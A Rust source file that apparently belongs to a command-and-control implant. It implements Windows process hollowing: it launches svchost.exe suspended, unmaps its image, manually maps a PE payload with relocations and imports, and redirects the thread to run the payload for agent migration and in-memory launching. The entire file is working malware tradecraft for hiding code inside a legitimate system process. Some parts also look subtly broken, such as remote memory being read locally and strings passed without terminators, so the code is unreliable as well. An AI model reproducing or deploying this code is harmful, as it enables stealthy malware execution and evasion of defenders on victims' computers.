//! Windows process-hollowing primitive.
//!
//! Spawns `C:\Windows\System32\svchost.exe` suspended, unmaps its original
//! image, and replaces it with a PE payload. The payload is manually mapped by
//! parsing PE headers, copying sections to their virtual addresses, applying
//! base relocations, and resolving imports. Used for both the agent's
//! `MigrateAgent` capability and the launcher's in-memory payload execution.

use anyhow::{anyhow, Result};
use std::ffi::{c_void, CStr, OsStr};
use std::mem::{size_of, zeroed};
use std::os::windows::ffi::OsStrExt;
use winapi::shared::minwindef::{FARPROC, HMODULE};
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{
    CreateProcessW, GetProcessInformation, ResumeThread, PROCESS_INFORMATION, STARTUPINFOW,
};
use winapi::um::winbase::{CREATE_SUSPENDED, DETACHED_PROCESS};
use winapi::um::winnt::{
    CONTEXT, CONTEXT_FULL, DUPLICATE_SAME_ACCESS, HANDLE, IMAGE_BASE_RELOCATION,
    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DOS_HEADER,
    IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_HEADERS, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW,
    IMAGE_SECTION_HEADER, IMAGE_SNAP_BY_ORDINAL, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
    PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PVOID,
};
use winapi::um::wow64apiset::{GetThreadContext, SetThreadContext};

#[link(name = "ntdll")]
extern "C" {
    fn NtUnmapViewOfSection(ProcessHandle: HANDLE, BaseAddress: PVOID) -> i32;
}

/// Spawn a host process suspended and run `payload` in its address space.
pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
    if payload.len() < size_of::<IMAGE_DOS_HEADER>() {
        return Err(anyhow!("payload too small to contain DOS header"));
    }
    let dos_header = unsafe { &*(payload.as_ptr() as *const IMAGE_DOS_HEADER) };
    if dos_header.e_magic != 0x5A4D {
        return Err(anyhow!("invalid DOS magic"));
    }
    let nt_headers_offset = dos_header.e_lfanew as usize;
    if nt_headers_offset + size_of::<IMAGE_NT_HEADERS>() > payload.len() {
        return Err(anyhow!("payload truncated before NT headers"));
    }
    let nt_headers = unsafe {
        &*((payload.as_ptr() as usize + nt_headers_offset) as *const IMAGE_NT_HEADERS)
    };
    if nt_headers.Signature != 0x00004550 {
        return Err(anyhow!("invalid NT signature"));
    }

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let cmd: Vec<u16> = OsStr::new("C:\\Windows\\System32\\svchost.exe")
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let ok = unsafe {
        CreateProcessW(
            std::ptr::null(),
            cmd.as_ptr() as *mut _,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | DETACHED_PROCESS,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        )
    };
    if ok == 0 {
        return Err(anyhow!("CreateProcessW failed: {}", std::io::Error::last_os_error()));
    }

    // Unmap the original executable's memory
    let mut base_addr_ptr: PVOID = std::ptr::null_mut();
    let info_class = 27; // ProcessBasicInformation
    let mut return_length: u32 = 0;
    unsafe {
        let status = winapi::um::winternl::NtQueryInformationProcess(
            pi.hProcess,
            info_class,
            &mut base_addr_ptr as *mut _ as *mut c_void,
            (size_of::<PVOID>() * 2) as u32,
            &mut return_length,
        );
        if status != 0 {
            // Fallback for 32-bit, read PEB directly
            let mut ctx: CONTEXT = zeroed();
            ctx.ContextFlags = CONTEXT_FULL;
            if GetThreadContext(pi.hThread, &mut ctx) == 0 {
                return Err(anyhow!("GetThreadContext failed: {}", std::io::Error::last_os_error()));
            }
            #[cfg(target_arch = "x86_64")]
            let peb_addr = ctx.Rdx as *const u8;
            #[cfg(target_arch = "x86")]
            let peb_addr = ctx.Ebx as *const u8;

            let mut image_base_addr: [u8; size_of::<usize>()] = [0; size_of::<usize>()];
            let mut bytes_read: usize = 0;
            if winapi::um::memoryapi::ReadProcessMemory(
                pi.hProcess,
                (peb_addr as usize + 0x10) as *const _,
                image_base_addr.as_mut_ptr() as *mut _,
                size_of::<usize>(),
                &mut bytes_read,
            ) == 0 {
                 return Err(anyhow!("ReadProcessMemory for PEB failed: {}", std::io::Error::last_os_error()));
            }
            base_addr_ptr = usize::from_ne_bytes(image_base_addr) as PVOID;
        }
    }

    if !base_addr_ptr.is_null() {
        unsafe {
            let res = NtUnmapViewOfSection(pi.hProcess, base_addr_ptr);
            if res != 0 {
                // This may fail if ASLR is not active, which is fine.
                tracing::warn!("NtUnmapViewOfSection failed with status {:#x}", res);
            }
        }
    }

    // Allocate new memory for the payload
    let image_base = unsafe {
        VirtualAllocEx(
            pi.hProcess,
            nt_headers.OptionalHeader.ImageBase as *mut _,
            nt_headers.OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    let (image_base, is_relocated) = if image_base.is_null() {
        // Allocation at preferred address failed, try anywhere
        let new_base = unsafe {
            VirtualAllocEx(
                pi.hProcess,
                std::ptr::null_mut(),
                nt_headers.OptionalHeader.SizeOfImage as usize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if new_base.is_null() {
            return Err(anyhow!("VirtualAllocEx failed: {}", std::io::Error::last_os_error()));
        }
        (new_base, true)
    } else {
        (image_base, false)
    };

    // Copy headers
    let mut written: usize = 0;
    let ok = unsafe {
        WriteProcessMemory(
            pi.hProcess,
            image_base,
            payload.as_ptr() as *const _,
            nt_headers.OptionalHeader.SizeOfHeaders as usize,
            &mut written,
        )
    };
    if ok == 0 {
        return Err(anyhow!("WriteProcessMemory for headers failed: {}", std::io::Error::last_os_error()));
    }

    // Copy sections
    let section_headers_offset = nt_headers_offset + size_of::<IMAGE_NT_HEADERS>();
    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: &IMAGE_SECTION_HEADER = unsafe {
            &*((payload.as_ptr() as usize
                + section_headers_offset
                + (i as usize * size_of::<IMAGE_SECTION_HEADER>()))
                as *const IMAGE_SECTION_HEADER)
        };

        let section_dest =
            (image_base as usize + section_header.VirtualAddress as usize) as *mut _;
        let section_src =
            (payload.as_ptr() as usize + section_header.PointerToRawData as usize) as *const _;

        let mut written: usize = 0;
        let ok = unsafe {
            WriteProcessMemory(
                pi.hProcess,
                section_dest,
                section_src as *const _,
                section_header.SizeOfRawData as usize,
                &mut written,
            )
        };
        if ok == 0 {
            return Err(anyhow!("WriteProcessMemory for section {} failed: {}",
                String::from_utf8_lossy(&section_header.Name), std::io::Error::last_os_error()));
        }
    }

    // Perform base relocations if needed
    if is_relocated {
        let delta = image_base as isize - nt_headers.OptionalHeader.ImageBase as isize;
        let reloc_dir = &nt_headers.OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

        if reloc_dir.VirtualAddress > 0 && reloc_dir.Size > 0 {
            let mut current_reloc_block_offset = reloc_dir.VirtualAddress as usize;
            let reloc_end = current_reloc_block_offset + reloc_dir.Size as usize;

            while current_reloc_block_offset < reloc_end {
                let reloc_block_header: &IMAGE_BASE_RELOCATION = unsafe {
                    &*((payload.as_ptr() as usize + current_reloc_block_offset)
                        as *const IMAGE_BASE_RELOCATION)
                };
                let block_size = reloc_block_header.SizeOfBlock as usize;
                let num_entries = (block_size - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<u16>();

                for i in 0..num_entries {
                    let entry_offset = current_reloc_block_offset
                        + size_of::<IMAGE_BASE_RELOCATION>()
                        + (i * size_of::<u16>());
                    let entry = unsafe { *(payload.as_ptr().add(entry_offset) as *const u16) };
                    let reloc_type = entry >> 12;
                    let reloc_offset = entry & 0x0FFF;

                    if reloc_type == IMAGE_REL_BASED_HIGHLOW || reloc_type == IMAGE_REL_BASED_DIR64 {
                        let patch_addr = (image_base as usize
                            + reloc_block_header.VirtualAddress as usize
                            + reloc_offset as usize) as *mut isize;

                        let mut original_addr: isize = 0;
                        let mut bytes_read: usize = 0;
                        unsafe {
                            if winapi::um::memoryapi::ReadProcessMemory(
                                pi.hProcess,
                                patch_addr as *const _,
                                &mut original_addr as *mut _ as *mut _,
                                size_of::<isize>(),
                                &mut bytes_read,
                            ) == 0 {
                                continue; // Or handle error
                            }
                        }

                        let new_addr = original_addr + delta;
                        let mut bytes_written: usize = 0;
                        unsafe {
                            if WriteProcessMemory(
                                pi.hProcess,
                                patch_addr as *mut _,
                                &new_addr as *const _ as *const _,
                                size_of::<isize>(),
                                &mut bytes_written,
                            ) == 0
                            {
                                // Handle error
                            }
                        }
                    }
                }
                current_reloc_block_offset += block_size;
            }
        }
    }

    // Resolve imports
    let import_dir = &nt_headers.OptionalHeader.DataDirectory
        [IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress > 0 {
        let mut import_desc_offset = import_dir.VirtualAddress as usize;
        loop {
            let import_desc: &IMAGE_IMPORT_DESCRIPTOR = unsafe {
                &*((image_base as usize + import_desc_offset) as *const IMAGE_IMPORT_DESCRIPTOR)
            };
            if import_desc.Name == 0 {
                break;
            }

            let lib_name_addr = (image_base as usize + import_desc.Name as usize) as *const i8;
            let lib_name = unsafe { CStr::from_ptr(lib_name_addr) }.to_str().unwrap();
            let lib_handle = unsafe { LoadLibraryA(lib_name.as_ptr() as *const i8) };

            if lib_handle.is_null() {
                return Err(anyhow!("Failed to load library {}", lib_name));
            }

            let mut thunk_offset = import_desc.FirstThunk as usize;
            loop {
                let thunk_addr = (image_base as usize + thunk_offset) as *mut usize;
                let func_addr_val = unsafe { *thunk_addr };
                if func_addr_val == 0 {
                    break;
                }

                let proc_addr: FARPROC = if IMAGE_SNAP_BY_ORDINAL(func_addr_val as u64) {
                    let ordinal = (func_addr_val & 0xFFFF) as u16;
                    unsafe { GetProcAddress(lib_handle, ordinal as *const i8) }
                } else {
                    let import_by_name_addr = (image_base as usize + func_addr_val) as *const i8;
                    // The address of a string that holds the name of the function
                    let func_name_addr = import_by_name_addr.add(2);
                    let func_name = unsafe { CStr::from_ptr(func_name_addr) }.to_str().unwrap();
                    unsafe { GetProcAddress(lib_handle, func_name.as_ptr() as *const i8) }
                };

                if proc_addr.is_null() {
                    return Err(anyhow!("Failed to get address for function in {}", lib_name));
                }

                let mut written: usize = 0;
                unsafe {
                    if WriteProcessMemory(
                        pi.hProcess,
                        thunk_addr as *mut _,
                        &proc_addr as *const _ as *const _,
                        size_of::<usize>(),
                        &mut written,
                    ) == 0
                    {
                        return Err(anyhow!("WriteProcessMemory for IAT failed"));
                    }
                }
                thunk_offset += size_of::<usize>();
            }
            import_desc_offset += size_of::<IMAGE_IMPORT_DESCRIPTOR>();
        }
    }

    // Set protection on sections
    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: &IMAGE_SECTION_HEADER = unsafe {
            &*((payload.as_ptr() as usize
                + section_headers_offset
                + (i as usize * size_of::<IMAGE_SECTION_HEADER>()))
                as *const IMAGE_SECTION_HEADER)
        };

        let addr = (image_base as usize + section_header.VirtualAddress as usize) as *mut _;
        let size = section_header.Misc.VirtualSize as usize;
        let mut characteristics = section_header.Characteristics;
        let mut old_protect = 0;

        // Map PE section characteristics to Windows memory protection constants
        let new_protect = if characteristics & 0x02000000 != 0 { // IMAGE_SCN_MEM_EXECUTE
            if characteristics & 0x08000000 != 0 { // IMAGE_SCN_MEM_WRITE
                PAGE_EXECUTE_READWRITE
            } else if characteristics & 0x04000000 != 0 { // IMAGE_SCN_MEM_READ
                PAGE_EXECUTE_READ
            } else {
                PAGE_EXECUTE_READ // Default executable to readable
            }
        } else if characteristics & 0x08000000 != 0 { // IMAGE_SCN_MEM_WRITE
            PAGE_READWRITE
        } else if characteristics & 0x04000000 != 0 { // IMAGE_SCN_MEM_READ
            PAGE_READWRITE // Promote to RW for simplicity
        } else {
            PAGE_READWRITE // Default
        };


        unsafe {
            if VirtualProtectEx(pi.hProcess, addr, size, new_protect, &mut old_protect) == 0 {
                tracing::warn!("VirtualProtectEx failed for section {}", String::from_utf8_lossy(&section_header.Name));
            }
        }
    }


    let entry_point = image_base as usize + nt_headers.OptionalHeader.AddressOfEntryPoint as usize;

    let mut ctx: CONTEXT = unsafe { zeroed() };
    ctx.ContextFlags = CONTEXT_FULL;
    if unsafe { GetThreadContext(pi.hThread, &mut ctx) } == 0 {
        return Err(anyhow!("GetThreadContext failed: {}", std::io::Error::last_os_error()));
    }
    #[cfg(target_arch = "x86_64")]
    {
        ctx.Rcx = entry_point as u64;
    }
    #[cfg(target_arch = "x86")]
    {
        ctx.Eax = entry_point as u32;
    }
    if unsafe { SetThreadContext(pi.hThread, &ctx) } == 0 {
        return Err(anyhow!("SetThreadContext failed: {}", std::io::Error::last_os_error()));
    }
    if unsafe { ResumeThread(pi.hThread) } == u32::MAX {
        return Err(anyhow!("ResumeThread failed: {}", std::io::Error::last_os_error()));
    }
    tracing::info!(pid = pi.dwProcessId, "hollowed payload running");
    Ok(())
}
